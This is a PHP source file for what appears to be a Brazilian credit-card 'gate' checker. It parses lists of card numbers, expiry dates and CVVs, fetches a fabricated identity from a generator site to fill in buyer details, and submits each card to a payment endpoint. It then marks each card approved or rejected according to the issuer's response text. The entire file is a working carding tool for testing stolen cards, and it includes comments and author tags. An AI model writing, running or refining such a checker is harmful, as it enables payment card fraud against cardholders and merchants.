<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","Â»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

/*if($ano == 2019){  //QUANDO O ANO DO GATE NÃƒO TIVER 20, USE ESSA FUNÃ‡ÃƒO '.$ano1.'
$ano1 = "19";
}else if($ano == 2020){
$ano1 = "20";
}else if($ano == 2021){
$ano1 = "21";
}else if($ano == 2022){
$ano1 = "22";
}else if($ano == 2023){
$ano1 = "23";
}else if($ano == 2024){
$ano1 = "24";
}else if($ano == 2025){
$ano1 = "25";
}else if($ano == 2026){
$ano1 = "26";
}else if($ano == 2027){
$ano1 = "27";
}else if($ano == 2028){
$ano1 = "28";
}else if($ano == 2029){
$ano1 = "29";
}else if($ano == 2030){
$ano1 = "30";
}else if($ano == 2031){
$ano1 = "31";
}else{
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> Validade Invalida</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

/*if($cc[0]==4){ //QUANDO VOCÃŠ NÃƒO QUISER QUE TESTE UMA TAL GERADA NO GATE
'<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==5){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==3){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==2){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==1){
     '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//=========================================//4 DEVS PHP//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();

//=========================================//PEGAR AS REQUEST DO TOKEN DO SITE//=========================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Content-Type: application/x-www-form-urlencoded',
'host: ',
'Origin: ',
'Referer: ',
'cookie: ',
'sec-fetch-mode: navigate',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36',
//'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
echo $retorn = curl_exec($ch);

include("consultabin.php");
$bin = " $level  $pais ";

if (strpos($retorn, 'Unauthorized. Expiry date expired.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-danger'>Retorno: LR 112</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#FREDOSCOFIELD</div>";

}elseif (strpos($retorn, 'Unauthorized. Nonexistent card.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-danger'>Retorno: Cartão não existe</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#FREDOSCOFIELD</div>";


}elseif (strpos($retorn, 'Unauthorized. Transaction type not allowed for this card.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-warning'>Retorno: Unauthorized. Transaction type nota allowed for this card.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}elseif (strpos($retorn, 'Unauthorized. Insufficient funds.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-danger'>Retorno: Unauthorided. Insuficiente fundos.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}elseif (strpos($retorn, 'Unauthorized. Invalid security code.') !== false) {
echo
"<span class='label label-success'> #APROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-success'> Retorno: Unauthorized. Invalid security code.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";



 }else {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-warning'>Unauthorized. Identified moderate risk by the issuer. Ou Unauthorized. Restricted card.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}

?>